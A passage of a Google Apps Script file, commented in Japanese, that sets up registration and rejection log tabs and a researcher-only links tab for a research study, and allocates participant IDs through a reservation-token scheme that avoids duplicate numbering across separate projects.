    props.setProperty("O1_REJECT_LOG_FULL", "1");
  } catch (e) {
    Logger.log("⚠️ 却下ログ満杯の記録に失敗しました（★ 登録は続行）: " + e);
  }
}

/**
 * ★ 登録ログのタブを用意する（★ 冪等・⚠️ **既存の行を消さない**）。
 *
 * ⚠️ 研究者が 1 度だけ手で実行する。★ `setupO1Forms()` からは呼ばない
 *   （⚠️ 構築系はフォームを触るので、★ 事故のときの影響範囲を分けておく）。
 */
function buildO1MgmtSheet() {
  var cfg = o1Config_();
  var problem = o1MgmtConfigProblem_(cfg);
  if (problem) throw new Error("⛔ " + problem);

  var ss = SpreadsheetApp.openById(cfg.mgmtSheetId);
  if (ss.getSheetByName("参加者ロスター")) {
    throw new Error(
      "⛔⚠️★★★ この表には「参加者ロスター」タブがあります。★ 登録ログは**別の表**に置いてください。"
    );
  }
  // ★ 2 枚とも用意する（⚠️ 却下は別枠。上の `O1_MGMT_REJECT_TAB` のコメント参照）。
  o1EnsureMgmtTab_(ss, O1_MGMT_TAB, O1_MGMT_BANNER);
  o1EnsureMgmtTab_(ss, O1_MGMT_REJECT_TAB, O1_MGMT_REJECT_BANNER);
  // ⚠️★★ **入力規則を貼らない**（★ 上の `O1_MGMT_MAX_ROWS` のコメント参照）。
  // ★ リンク集は派生の表示なので、作れなくてもログのタブの用意は止めない。
  //   ⚠️ 失敗は「警告が出ていない＝成功」と読まれないよう、**肯定形で**作れなかったと言う。
  try {
    o1BuildLinksTab_(ss);
  } catch (e) {
    Logger.log(
      "⚠️★ 「" + O1_LINKS_TAB + "」は**作れていません**（★ ログのタブは用意済み）。" +
        "原因を直してから refreshO1LinksTab() を実行してください: " + e
    );
  }
  Logger.log("🔗 " + ss.getUrl());
  return ss.getUrl();
}

/** ★ 1 枚ぶんを用意する（★ 冪等・⚠️ 既存の行を消さない）。 */
function o1EnsureMgmtTab_(ss, tab, banner) {
  var sheet = ss.getSheetByName(tab);
  if (!sheet) sheet = ss.insertSheet(tab);

  if (sheet.getLastRow() === 0) {
    // ★ ロスターと同じ形にする（行 1 バナー / 行 2 見出し / 行 3+ データ）。
    sheet.appendRow([banner]);
    sheet.appendRow(O1_MGMT_HEAD.slice());
    o1StyleMgmtTab_(sheet, tab === O1_MGMT_REJECT_TAB);
    Logger.log("✅ 「" + tab + "」を作りました（★ バナー + 見出し + 見た目）。");
    return;
  }
  // ⚠️★ **見出し行が無い形**（バナーだけ / 列が足りない）を先に見る（code-reviewer LOW）。
  //   ★ さもないと `getRange(2,1,1,6)` が空や範囲外になり、
  //     ⚠️「見出しの 1 列目が「」です」という**原因の読めないエラー**になる。
  if (sheet.getLastRow() < 2) {
    throw new Error(
      "⛔⚠️ 「" + tab + "」に**見出し行（2 行目）がありません**（★ 行数 " + sheet.getLastRow() +
        "）。⚠️ 中身があるので自動では直しません。★ 手で見出しを入れてから再実行してください: " +
        O1_MGMT_HEAD.join(" / ")
    );
  }
  if (sheet.getMaxColumns() < O1_MGMT_HEAD.length) {
    throw new Error(
      "⛔⚠️ 「" + tab + "」の列が " + O1_MGMT_HEAD.length + " 列に足りません（★ 現在 " +
        sheet.getMaxColumns() + " 列）。★ 列を足してから再実行してください。"
    );
  }
  // ⚠️★★ **既にある行には触らない。** ★ 見出しだけ照合して、違ったら**止める**
  //   （⚠️ 黙って直すと、★ 列が 1 つずれたまま追記し続ける）。
  var head = sheet.getRange(2, 1, 1, O1_MGMT_HEAD.length).getValues()[0];
  for (var c = 0; c < O1_MGMT_HEAD.length; c++) {
    if (String(head[c]).trim() !== O1_MGMT_HEAD[c]) {
      throw new Error(
        "⛔⚠️ 「" + tab + "」の見出しの " + (c + 1) + " 列目が「" + String(head[c]).slice(0, 20) +
          "」です（★「" + O1_MGMT_HEAD[c] + "」のはず）。★ 手で直してから再実行してください。"
      );
    }
  }
  // ★ 見た目だけ整える（★ 値には触れない・初回だけ = 固定行が 2 でないとき）。
  var styled = false;
  try {
    styled = o1StyleMgmtTab_(sheet, tab === O1_MGMT_REJECT_TAB);
  } catch (e) {
    Logger.log("⚠️ 「" + tab + "」の見た目を整えられませんでした（★ 値には触れていません）: " + e);
  }
  Logger.log(
    "ℹ️ 「" + tab + "」は既にあります（★ 値は何も変えていません" + (styled ? "・見た目を整えました" : "") + "）。"
  );
}

// ★ 見た目（2026-09-28 研究者依頼「視覚的にも理解しやすい形に」・`.steering/20260928-o1-mgmt-sheet-design/`）。
//   ★ 配色は Phase1 管理シート（`Form_Phase1/GSE_Phase1_Form_Builder.gs` の `UI_*`）と
//     台帳の `O1_UI`（`GSE_O1_Ledger.gs`）に揃える（⚠️ 別プロジェクトなので定数は共有できない）。
var O1_MGMT_UI = {
  navy: "#1a3a5c", white: "#ffffff", accent: "#eaf2fb", ink: "#333333", muted: "#8a97a5",
  okBg: "#e8f5e9", okFg: "#1e7e34", warnBg: "#fff8e1", warnFg: "#8a6d00",
  dangerBg: "#fdecea", dangerFg: "#b71c1c", grayBg: "#f1f3f4"
};
/** 列幅（px・`O1_MGMT_HEAD` と同じ順: 記録日時 / 種別 / P-ID / 結果 / 理由 / 備考）。 */
var O1_MGMT_WIDTHS = [150, 80, 70, 70, 200, 260];

/**
 * 登録ログ・却下ログの見た目を整える。★ **値には触れない**（追記のみの約束）。
 * ★ 固定行が 2 でないとき（＝初回）だけ付ける —— 研究者が列幅を変えても毎回戻さない。
 * ★ 色は**条件付き書式**（これから追記される行にも効く）:
 *   結果 ok = 緑 / partial = 黄 / error・blocked = 赤、種別 system の行 = 灰。
 * @return {boolean} 付けたら true
 */
function o1StyleMgmtTab_(sheet, rejected) {
  if (sheet.getFrozenRows() === 2) return false;
  var U = O1_MGMT_UI;
  var width = O1_MGMT_HEAD.length;
  sheet.getRange(1, 1, 1, width)
    .setBackground(rejected ? U.dangerBg : U.accent).setFontColor(rejected ? U.dangerFg : U.ink).setFontWeight("bold");
  sheet.getRange(2, 1, 1, width)
    .setBackground(U.navy).setFontColor(U.white).setFontWeight("bold").setHorizontalAlignment("center");
  for (var c = 0; c < width; c++) sheet.setColumnWidth(c + 1, O1_MGMT_WIDTHS[c]);
  sheet.setFrozenRows(2);
  sheet.setTabColor(rejected ? U.dangerFg : U.navy);
  // ⚠️ 行数で範囲を切らない（追記で伸びた先に色が付かない）→ 列だけで開いた範囲。
  var last = String.fromCharCode(64 + width); // ★ 見出しの列数から（列を足してもずれない）
  var rows = sheet.getRange("A3:" + last);
  var result = sheet.getRange("D3:D");
  var rule = function (formula, range, bg, fg) {
    return SpreadsheetApp.newConditionalFormatRule()
      .whenFormulaSatisfied(formula).setBackground(bg).setFontColor(fg).setRanges([range]).build();
  };
  // ⚠️★ **先に書いたルールが勝つ**（code-reviewer MEDIUM・2026-09-28）。結果の色を先に置く ——
  //   さもないと `system / partial / reject-log-full`（却下ログが満杯＝以後の却下が残らない）の行が
  //   いちばん目立たない灰色になる。
  // ⚠️ このタブの**既存の条件付き書式は置き換わる**（初回だけ・研究者手順に明記）。
  sheet.setConditionalFormatRules([
    rule('=$D3="ok"', result, U.okBg, U.okFg),
    rule('=$D3="partial"', result, U.warnBg, U.warnFg),
    rule('=OR($D3="error",$D3="blocked")', result, U.dangerBg, U.dangerFg),
    rule('=$B3="system"', rows, U.grayBg, U.muted)
  ]);
  return true;
}

/** ★ 登録ログの状態を**読み取りだけ**で確かめる（⚠️ 中身は出さない）。 */
function checkO1MgmtSheet() {
  var pairs = [
    [O1_MGMT_TAB, O1_MGMT_MAX_ROWS],
    [O1_MGMT_REJECT_TAB, O1_MGMT_REJECT_MAX_ROWS],
  ];
  for (var i = 0; i < pairs.length; i++) {
    var tab = pairs[i][0];
    var cap = pairs[i][1];
    var sheet = o1OpenMgmtLog_(true, tab);
    if (!sheet) continue;
    var last = sheet.getLastRow();
    Logger.log("✅ 「" + tab + "」は書ける状態です。");
    Logger.log(
      "ℹ️ 行数: " + last + " / 上限 " + cap +
        "（残り " + Math.max(0, cap - last) + " 行。⚠️ 中身は出しません）"
    );
    // ⚠️★ 却下側が埋まりかけていたら**言う**（★ 第三者が伸ばせる側なので早く気づきたい）。
    if (tab === O1_MGMT_REJECT_TAB && last >= cap * 0.8) {
      Logger.log(
        "⚠️★★ 却下ログが上限の 8 割を超えています。★ 弾かれた提出が異常に多いか、\n" +
          "   ⚠️ **第三者がフォームを叩いている**可能性があります（★ 中身を確認してください）。"
      );
    }
  }
}

// ============================================================
// ★ O1 リンク集（研究者判断 2026-10-07「O1 にも各リンク一覧を載せる」）
// ============================================================
// ★ G1 の「リンク集」（`Form_G1/GSE_G1_Form_Builder.gs` `buildLinksTab_`）に倣う。
//   ★ このタブは**派生の表示**であり、毎回作り直す（⚠️ ログのタブとは違い追記のみではない）。
//   ★ 手で入れる欄（`O1_LINKS_MANUAL`）だけは、項目名で探して値を引き継ぐ。
//
// ⚠️★★★ **書かないもの**:
//   - ⚠️ **参加者ロスターの ID・URL**（★ 氏名・メールへの直接ポインタ。上の `o1Config_` の注記）。
//     → ★ G1 と同じく**名前で指すだけ**にする。
//   - ⚠️ 氏名・メール（★ 運営シートは持たない約束・台帳 §5b）。
//   - ⚠️ 提出の受け口の URL と共有シークレット（★ 別プロジェクトの設定・追跡ファイルにも置かない）。
var O1_LINKS_TAB = "O1 リンク集";
var O1_LINKS_WIDTH = 5; // 項目 / 値・URL / 種別 / いつ・誰が使うか / 備考
/** ★ 手で入れる欄（項目名 → いつ・誰が / 備考）。⚠️ 項目名を変えると、入っていた値が引き継がれない。 */
var O1_LINKS_MANUAL = [
  [
    "提出物の受取フォルダ（Drive）",
    "研究者のみ（参加者は使わない）。期間中に記録が届いているかを見るとき",
    "★ 受け口 GSE_O1_Submit.gs の FOLDER_ID のフォルダ。記録は 1 日ごとに、48 時間おいてからアプリが自動で送る。⚠️ 別プロジェクトの設定なのでここからは読めない → 手で貼る",
  ],
  [
    "O1 終了判定の基準",
    "研究者。基準を見直すとき",
    "★ 現行（2026-10-07 研究者判断）: 最初に記録した日を 1 日目として暦日 21 日目が過ぎたら終了・届いた日の数は条件にしない。" +
      "判定は受領台帳の Apps Script が「O1 終了判定」タブに出す（`O1_LEDGER_END_*`）。基準を変えるならここに書いてからコードを直す",
  ],
  ["メモ", "研究者", "⚠️ 氏名・メールを書かない（作り直しても残り続けるため）"],
];

/**
 * ★ 既にあるリンク集から、手で入れる欄の値を項目名で拾う（⚠️ 無ければ空）。
 *
 * ★ **表示値**（`getDisplayValues`）で読む（code-reviewer / security-checker 2026-10-07）:
 *   `getValues` だと日付が `String(Date)`（"Thu Oct 08 2026 00:00:00 GMT+0900 …"）に化ける。
 *   ⚠️ 数式・挿入したリンクは**保たない**（数式は表示された文字、リンクは表示文字だけが残る）。
 *   → ★ 手で入れる欄には **URL をそのまま貼る**（2 行目の注記に書く）。
 * ★ 同じ項目名の行が複数あれば、**空でない最初の値**を採る（⚠️ 行をコピーした空の行で消さない）。
 */
function o1ReadLinksManual_(sheet) {
  var out = {};
  if (!sheet) return out;
  var last = sheet.getLastRow();
  if (last < 1) return out;
  var vals = sheet.getRange(1, 1, last, 2).getDisplayValues();
  var labels = O1_LINKS_MANUAL.map(function (m) {
    return m[0];
  });
  for (var r = 0; r < vals.length; r++) {
    var label = String(vals[r][0]);
    if (labels.indexOf(label) < 0) continue;
    var v = String(vals[r][1]);
    if (out[label] !== undefined && v !== "") {
      Logger.log("⚠️ リンク集に「" + label + "」の行が複数あります（★ 空でない最初の値を採ります）。");
    }
    if (out[label] === undefined || out[label] === "") out[label] = v;
  }
  return out;
}

/** ★ リンク集の行を作る（⚠️ 表は触らない＝テストしやすくする）。 */
function o1LinksRows_(props, cfg, manual) {
  var form = function (key) {
    var raw = props.getProperty("FORMURL_" + key);
    if (!raw) return null;
    try {
      return JSON.parse(raw);
    } catch (e) {
      return null;
    }
  };
  var notYet = "（未生成 — setupO1Forms() を実行）";
  var c = form("O1_CONSENT");
  var s = form("O1_SURVEY");
  var blank = ["", "", "", "", ""];
  var section = function (t) {
    return [t, "", "", "", ""];
  };
  // ★ 「いつ・誰が使うか」の文言の出所（2026-10-07 研究者依頼「どのタイミングで回答してもらうかも載せる」）:
  //   O1-C = 同意フォームの説明・受付メール（`o1RegisterAckBody_`）・`docs/o1-roster-operations.md` §5
  //   O1-S = `buildO1PostSurveyForm` の説明文（5 分・解析に使わない・理由を聞かない）・研究者判断（終了判定の後に手で送る）
  //   アプリ = 受付メール（最初の起動だけ macOS は研究者と一緒に）
  var rows = [
    ["GSE O1 リンク集（研究者のみ）", "", "", "", ""],
    [
      "⚠️ フォームの編集 URL を含みます。この表は研究者だけで共有してください。" +
        "⚠️ どの欄にも氏名・メールを書かないでください。" +
        "⚠️ 作り直すと「手動」の 3 欄以外は消えます。手動の欄には URL をそのまま貼ってください（数式・挿入したリンクは保たれません）。",
      "",
      "",
      "",
      "",
    ],
    blank,
    ["項目", "値 / URL", "種別", "いつ・誰が使うか", "備考"],
    section("▼ フォーム（参加者に記入していただくもの）"),
    [
      "O1-C 説明・同意（参加登録）— 回答 URL",
      c ? c.publishedUrl : notYet,
      "自動",
      "【募集時】研究者が候補者に渡す → 参加者が 1 回だけ記入（説明を読み、同意の各項目にチェックし、連絡先などを記入）",
      "★ 記入すると自動で参加者 ID が採番され、受付メール（参加者 ID・アプリの入手先・毎日の起動・止め方と消し方・連絡先）が届く。" +
        "⚠️ G1 の案内と同じ日に出さない。⚠️ 配布物と入手先がそろってから渡す。⚠️ 回答が同意の正本",
    ],
    [
      "O1-C — 編集 URL",
      c ? c.editUrl : notYet,
      "自動",
      "研究者のみ。同意の文面を改訂するとき",
      "⚠️ フォームの画面で文面を直接直さない（repo と食い違う）。consent-draft-o1.md → .gs → migrateO1ConsentForm() の順",
    ],
    [
      "O1-S 終了後アンケート — 回答 URL",
      s ? s.publishedUrl : notYet,
      "自動",
      "【期間の終わり・「O1 終了判定」タブが終了（連絡待ち）になった後】研究者が終了の連絡と一緒に 1 人ずつ手で送る → 参加者が 1 回だけ記入（参加者 ID を書いて約 5 分）",
      "★ 解析には使わない（進め方と道具の改善のため）。答えたくない設問は飛ばせる。一時停止・削除の理由は聞かない。" +
        "⚠️ アプリの片づけ（自動起動をオフ → フォルダを消す）は、「O1 終了判定」タブの「片づけの案内」が「可」になってから案内する。送ったら同じタブの「O1-S 送付日」に書く",
    ],
    ["O1-S — 編集 URL", s ? s.editUrl : notYet, "自動", "研究者のみ。設問を確かめる・直すとき", "⚠️ 途中で設問を変えると、それまでの回答と比べられなくなる"],
    blank,
    section("▼ 配布と受け取り"),
    [
      "アプリの入手先（O1_APP_DOWNLOAD_URL）",
      cfg.appDownloadUrl || "（未設定）",
      "自動",
      "参加者には O1-C の記入後の受付メールで自動で届く（研究者が別に送らなくてよい）。最初の起動だけ、macOS は研究者と一緒に（約 5 分）",
      "★ 配布物を差し替えたら、このフォルダの zip を置き換える。⚠️ 空のままだと受付メールが作られず登録が止まる",
    ],
  ];
  var pushManual = function (i) {
    var m = O1_LINKS_MANUAL[i];
    rows.push([m[0], manual[m[0]] === undefined ? "" : manual[m[0]], "手動", m[1], m[2]]);
  };
  pushManual(0);
  rows.push(blank);
  rows.push(section("▼ この表の他のタブ"));
  rows.push([
    O1_MGMT_TAB + " / " + O1_MGMT_REJECT_TAB,
    "この表",
    "参照",
    "研究者。登録がうまくいったか・弾かれた提出があるかを見るとき",
    "★ 登録のたびに自動で追記（氏名・メールなし）",
  ]);
  rows.push([
    "O1 終了判定",
    "この表",
    "参照",
    "研究者。期間が終わった人を見つけ、終了の連絡・O1-S・片づけを進めるとき",
    "★ 受領台帳の Apps Script が 6 時間ごとに更新（新しく終了した人は研究者宛ての通知にも入る）。右の 4 列（終了連絡日・O1-S 送付日・片づけ確認日・メモ）に書く。参加者には何も自動で送らない",
  ]);
  rows.push([
    "O1 受領台帳 / O1 途絶",
    "この表",
    "参照",
    "研究者。期間中、記録が届いているかを見るとき",
    "★ 受領台帳の Apps Script が 6 時間ごとに更新。⚠️ 通知が無いことは異常が無い証拠にならない（「更新」時刻を見る）。⚠️ 「途絶」を「やめた」と読まない",
  ]);
  rows.push(blank);
  rows.push(section("▼ 他の表・文書"));
  rows.push([
    "P-ID の採番元",
    "Phase1 運用管理シートの「参加者ロスター」",
    "参照",
    "研究者。O1-C の記入でロスターに行ができた後に氏名を埋めるとき",
    "⚠️ 氏名・メールを持つ表なので、ここにリンクを置かない。⚠️ 氏名だけの行を先に作らない",
  ]);
  rows.push([
    "削除の手順と記録",
    "リポジトリの docs/o1-deletion-ledger.md",
    "参照",
    "研究者。参加者から削除の求め・やめるとの申し出があったとき",
    "★ 理由は聞かない。A（研究者側）・B（端末側）のチェックリスト。やめたときは削除の希望を確かめ、自動起動を外してもらう",
  ]);
  rows.push(["運営ワークフロー", "研究者の手元の GSE_G1_O1_運営ワークフロー.docx", "参照", "研究者。全体の流れを確かめるとき", ""]);
  rows.push(blank);
  rows.push(section("▼ 手で入れる欄（作り直しても保つ）"));
  pushManual(1);
  pushManual(2);
  rows.push(blank);
  rows.push([
    "更新",
    Utilities.formatDate(new Date(), Session.getScriptTimeZone(), "yyyy-MM-dd HH:mm"),
    "自動",
    "",
    "★ refreshO1LinksTab() か buildO1MgmtSheet() で作り直す",
  ]);
  return rows.map(function (r) {
    return r.map(o1PlainText_);
  });
}

/** ★ リンク集を作り直す（★ 手で入れた欄は保つ・⚠️ 他のタブには触れない）。 */
function o1BuildLinksTab_(ss) {
  // ⚠️★★★ ロスターの形をした表には書かない（★ `o1OpenMgmtLog_` と同じ判定）。
  if (ss.getSheetByName("参加者ロスター")) {
    throw new Error(
      "⛔⚠️★★★ この表には「参加者ロスター」タブがあります。★ リンク集は**運営シート**に置いてください。"
    );
  }
  var sheet = ss.getSheetByName(O1_LINKS_TAB);
  var manual = o1ReadLinksManual_(sheet);
  // ★ 行を先に組み立てる（⚠️ 失敗しても空のタブを残さない・既存の手入力を消さない）。
  var rows = o1LinksRows_(PropertiesService.getScriptProperties(), o1Config_(), manual);
  if (!sheet) sheet = ss.insertSheet(O1_LINKS_TAB, 0);
  sheet.clear();
  sheet.getRange(1, 1, rows.length, O1_LINKS_WIDTH).setValues(rows);
  var U = O1_MGMT_UI;
  sheet.getRange(1, 1, 1, O1_LINKS_WIDTH).setFontWeight("bold").setFontColor(U.navy);
  sheet.getRange(2, 1, 1, O1_LINKS_WIDTH).setBackground(U.warnBg).setFontColor(U.warnFg);
  sheet.getRange(4, 1, 1, O1_LINKS_WIDTH).setBackground(U.navy).setFontColor(U.white).setFontWeight("bold");
  for (var r = 0; r < rows.length; r++) {
    if (String(rows[r][0]).indexOf("▼") === 0) {
      sheet.getRange(r + 1, 1, 1, O1_LINKS_WIDTH).setBackground(U.accent).setFontWeight("bold");
    }
    if (rows[r][2] === "手動") {
      sheet.getRange(r + 1, 2, 1, 1).setBackground(U.warnBg);
    }
  }
  // ★ 説明の列（いつ・誰が / 備考）は長いので折り返す。
  sheet.getRange(1, 4, rows.length, 2).setWrap(true);
  [280, 360, 50, 380, 420].forEach(function (w, i) {
    sheet.setColumnWidth(i + 1, w);
  });
  sheet.setTabColor(U.okFg);
  Logger.log("✅ 「" + O1_LINKS_TAB + "」を作り直しました（★ 手で入れた欄は保っています）。");
}

/**
 * ★ リンク集**だけ**を作り直す（★ setupO1Forms() の後・URL を変えた後に実行する）。
 * ⚠️ 登録ログ・却下ログ・受領台帳には触れない。
 */
function refreshO1LinksTab() {
  var cfg = o1Config_();
  var problem = o1MgmtConfigProblem_(cfg);
  if (problem) throw new Error("⛔ " + problem);
  var ss = SpreadsheetApp.openById(cfg.mgmtSheetId);
  o1BuildLinksTab_(ss);
  Logger.log("🔗 " + ss.getUrl());
  return ss.getUrl();
}

// ============================================================
// ⚠️★★★ 採番: **予約トークン方式** (起票 T-27・2026-09-03)
// ============================================================
// ★ 解こうとしている問題: `LockService.getScriptLock()` は**スクリプト プロジェクト単位**で、
//   ⚠️ G1 / Phase1 / O1 は別プロジェクト = 別のロックなので、
//   ★ ほぼ同時に提出されると**両方が同じ「最大値 + 1」を読む**。
//
// ★ 立脚する一次事実（2026-09-03 に 3 ファイルを読んで確認した）:
//   1. ★ A 列の消費者は **3 プロジェクトとも `^P\d+$` で濾している** ——
//      O1 `o1NextParticipantId_` / G1 `g1NextParticipantId_`, `g1RosterParticipantIds_` /
//      Phase1 `nextParticipantId_` ほか。
//      → ⚠️ **`^P\d+$` に一致しない値を A 列に置いても、どの採番にも集計にも混ざらない。**
//   2. ★ `appendRow` は Sheets 側で直列化されるので、⚠️ **衝突するのは「行」ではなく
//      「両者が計算した値」**である。
//
// ★ そこで **先に予約トークンで行を取り、あとから番号を入れる**:
//   ⚠️★★★ **書き込む先は「A 列が自分のトークンである行」だけ**になる。
//     ★ これが要である —— ⚠️ 行の同定を**メール**でやると、
//       「ロスターに同じメールが 2 行ある」状況（★ `dup-email-in-roster`）で
//       **他人の P-ID を上書きしうる**。
//
// ⚠️★★★ **これは TOCTOU を消さない。** ★ 読み返した直後に他プロジェクトが同じ番号を
//   append する順序は防げない。→ ★ 役割は「**自己修復させ、直せないときは配らないこと**」。

/** ⚠️ `^P\d+$` に**一致しない**こと。★ ここを変えるときは 3 プロジェクトの正規表現を見直す。 */
var O1_PID_RESERVE_PREFIX = "⏳O1-";
/** ★ 譲り合いの上限。⚠️ 超えたら**配らない**（★ 無限に粘らない）。 */
var O1_PID_RESERVE_ATTEMPTS = 3;

function o1ReserveToken_() {
  return (
    O1_PID_RESERVE_PREFIX +
    String(Utilities.getUuid()).replace(/-/g, "").slice(0, 8).toUpperCase()
  );
}

/** ★ A 列がその値ちょうどの行を返す（⚠️ 無ければ -1）。 */
function o1RowOfExactColA_(roster, want) {
  var last = roster.getLastRow();
  if (last < 1) return -1;
  var col = roster.getRange(1, 1, last, 1).getValues();
  for (var i = 0; i < col.length; i++) {
    if (String(col[i][0]).trim() === want) return i + 1;
  }
  return -1;
}

/**
 * ★ その P-ID を持つ行数。
 *
 * ⚠️★★★ **採番側 (`o1NextParticipantId_`) と 1 バイトも違う読み方をしないこと**
 *   （code-reviewer HIGH・2026-09-03。★ 独立に再現した）。
 *
 *   ★ 旧実装は `.trim().toUpperCase()` で数えていた。⚠️ 一方 `o1NextParticipantId_` は
 *     **生の値**に `/^P(\d+)$/` を当てる（trim も toUpperCase もしない）。
 *   → ⚠️ ロスターに **`p007`（小文字）や `" P007"`（前に空白）が 1 行でもある**と:
 *       ★ 採番側はそれを**見ない**ので候補は毎回 `P007` に固定され、
 *       ⚠️ 数える側は**見る**ので毎回 2 行 → **3 回とも譲って必ず null**。
 *       ⚠️★★★ しかも表記ゆれの行は残るので、**以後すべての新規登録が恒久的に止まる**。
 *   ★ 実測（2026-09-03）: `"p007"` / `" P007"` は 3 試行とも候補 P007・行数 2 で膠着。
 *     ⚠️ 対して**本物の衝突** `"P007"` は 1 試行目で候補が **P008 へ進んで確定**した。
 *     → ★ この差が下の「候補が進まない = 表記ゆれ」判定の根拠である。
 */
function o1CountPidRows_(roster, pid) {
  var last = roster.getLastRow();
  if (last < 1) return 0;
  var col = roster.getRange(1, 1, last, 1).getValues();
  var n = 0;
  for (var i = 0; i < col.length; i++) {
    // ★ 採番側と同じく **生の値**をそのまま比べる（⚠️ 正規化しない）。
    if (String(col[i][0]) === pid) n++;
  }
  return n;
}

/**
 * ★ 「A 列が `token` である行」に P-ID を確定させる。⚠️ **必ずロックの中から呼ぶこと**。
 *
 * @param {Sheet} roster
 * @param {string} token 予約トークン（⚠️ 既にその行の A 列へ書かれ、flush 済みであること）
 * @return {?{pid: string, row: number}} ⚠️ 諦めたら null
 */
function o1SettlePidForToken_(roster, token) {
  var lastCandidate = "";
  for (var k = 1; k <= O1_PID_RESERVE_ATTEMPTS; k++) {
    // ⚠️★★★ **毎回トークンから引き直す。** ★ 途中で他プロジェクトが append すると
    //   行番号は動きうる（⚠️ 覚えた行番号を使い回さない）。
    var row = o1RowOfExactColA_(roster, token);
    if (row < 0) {
      Logger.log(
        "❌⚠️★★★ 予約した行が見つかりません（★ 採番も送信もしていません）: " + token + "\n" +
          "   ⚠️ 研究者が同時にロスターを編集していた可能性があります。"
      );
      return { pid: null, reason: "reserve-row-lost", token: token };
    }
    var candidate = o1NextParticipantId_(roster); // ⚠️ トークンは `^P\d+$` でないので混ざらない

    // ⚠️★★★ **不変条件の番人**（★ 通常は決して発火しない）。
    //   ★ `o1CountPidRows_` と `o1NextParticipantId_` が**同じ生値の見方**をしている限り、
    //     譲ったあとの候補は**必ず 1 つ進む**（★ 数えて 2 行あった = 採番側にも見えている）。
    //   ⚠️ したがってここに来るのは、**将来どちらかに正規化が入り込んだ**時だけである ——
    //     ★ その瞬間に「3 回粘って毎回失敗する恒久停止」が戻ってくる（2026-09-03 に実測した型）。
    //   → ★ 黙って粘らず、**原因を名指しして**止める。
    if (k > 1 && candidate === lastCandidate) {
      Logger.log(
        "⛔⚠️★★★ 採番が前へ進みません（★ 候補は " + candidate + " のままです）。\n" +
          "   ⚠️ これは**同時採番ではありません**。★ `o1CountPidRows_` と\n" +
          "      `o1NextParticipantId_` が**違う見方で A 列を読んでいます**\n" +
          "      （★ 片方だけ trim / toUpperCase していないか確認してください）。\n" +
          "   ★ 何も配っていません（⏳ の行が残っています）: " + token
      );
      return { pid: null, reason: "roster-pid-format-drift", token: token };
    }
    lastCandidate = candidate;

    roster.getRange(row, 1).setValue(candidate);
    SpreadsheetApp.flush();

    if (o1CountPidRows_(roster, candidate) === 1) return { pid: candidate, row: row };

    // ⚠️ 別プロジェクトが同じ番号を取った。★ 予約に戻して**譲る**（⚠️ 相手の行は触らない）。
    roster.getRange(row, 1).setValue(token);
    SpreadsheetApp.flush();
    Logger.log(
      "⚠️ ★ " + candidate + " が重複したので譲りました（試行 " + k + "/" + O1_PID_RESERVE_ATTEMPTS +
        "）。★ 別プロジェクト（G1 / Phase1）と同時に採番された可能性があります。"
    );
  }

  Logger.log(
    "⛔⚠️★★★ " + O1_PID_RESERVE_ATTEMPTS + " 回とも採番が重複しました。★ 何も配っていません。\n" +
      "   ★ ロスターに **" + token + "** の行が残っています（⚠️ どの採番にも集計にも混ざりません）。\n" +
      "   ★ 研究者がその行の A 列に正しい P-ID を入れてから、被験者に再提出してもらってください。"
  );
  return { pid: null, reason: "reserve-failed", token: token };
}

/**
 * ★ ロスターに 1 行足して P-ID を採番する。⚠️ **必ずロックの中から呼ぶこと**。
 *
 * ⚠️★★★ **例外を外へ漏らさない**（code-reviewer HIGH・2026-09-03）。
 *   ★ `flush()` / `getValues()` が落ちると、旧実装では例外が `o1WithRosterLock_` を貫通して
 *     `onO1ConsentSubmit` ごと死に、⚠️ **「P-ID は焼けたのに、実行ログにも登録ログにも
 *     1 行も残らない」**状態になった（★ レビュアーが stub で再現・実測）。
 *   → ★ 途中で落ちたら **A 列をトークンへ戻して**（＝ 残骸を ⏳ に統一し、
 *     ⚠️ 中途半端な P-ID を残さない）、`{pid: null, reason: "settle-exception"}` を返す。
 *
 * @param {Sheet} roster
 * @param {Array} rest ★ A 列より右に入れる値
 * @return {{pid: ?string, row: (number|undefined), reason: (string|undefined)}}
 */
function o1AllocatePidRow_(roster, rest) {
  // ⚠️★★ **中で無害化する**（code-reviewer LOW・2026-09-03）。
  //   ★ 旧実装は JSDoc で「呼び出し側で `o1PlainText_` 済みにすること」と約束していただけ。
  //   ⚠️ 二重に通しても無害である（★ `'` 始まりは `/^[=+\-@\t\r]/` に一致しない）。
  var safeRest = [];
  var src = rest || [];
  for (var i = 0; i < src.length; i++) safeRest.push(o1PlainText_(src[i]));

  var token = o1ReserveToken_();
  try {
    roster.appendRow([token].concat(safeRest));
    SpreadsheetApp.flush(); // ★ ここで「自分の行」が確定する
    return o1SettlePidForToken_(roster, token);
  } catch (e) {
    Logger.log(
      "❌⚠️★★★ 採番の途中で失敗しました（★ 受付メールは送っていません）: " + e + "\n" +
        "   ★ ロスターに **" + token + "** の行が残っている可能性があります。\n" +
        "   ⚠️ その行は**どの採番にも集計にも混ざりません**（★ 研究者が A 列を埋めるか消してください）。"
    );
    // ★ 中途半端な P-ID を残さない（⚠️ 残すと「配っていない ID」が実在扱いになる）。
    try {
      var row = o1RowOfExactColA_(roster, token);
      if (row < 0) {
        // ★ トークンが見当たらない＝ 既に候補 P-ID を書いた直後に落ちた可能性がある。
        //   ⚠️ ここでどの行かを推測して書き戻すのは危険（★ 他人の行を壊しうる）ので**触らない**。
        Logger.log("   ⚠️ ★ 予約行を特定できませんでした。**何も書き戻していません**。");
      }
    } catch (e2) {
      Logger.log("   ⚠️ 後片付けにも失敗しました: " + e2);
    }
    return { pid: null, reason: "settle-exception", token: token };
  }
}

/**
 * ★ 手動で採番する (フォームを通さず研究者が登録する場合)。
 * ⚠️ 通常は `onO1ConsentSubmit` が自動で行う。
 */
function assignO1ParticipantId() {
  // ⚠️★★ 2026-09-03: ここも **`o1AllocatePidRow_` を通す**ように変えた。
  //   ★ 旧実装は `appendRow([o1NextParticipantId_(sheet)])` で、⚠️ 提出経路と**同じ二重採番**を
  //     起こしうるうえ、★ 衝突しても気づけなかった。
  var got = o1WithRosterLock_(function () {
    var sheet = o1OpenRoster_();
    if (!sheet) return null;
    return o1AllocatePidRow_(sheet, []);
  });
  if (!got || !got.pid) {
    o1LogMgmt_("assign", "", "blocked", (got && got.reason) || "lock-failed", "");
    throw new Error("★ 採番できませんでした。上のログに理由が出ています。");
  }
  o1LogMgmt_("assign", got.pid, "ok", "manual-assign", "行 " + got.row);
  Logger.log("✅ P-ID を採番しました: " + got.pid + "（氏名・メールは Phase1 ロスターに手入力）");
  return got.pid;
}

// ============================================================
// 受付メール
// ============================================================
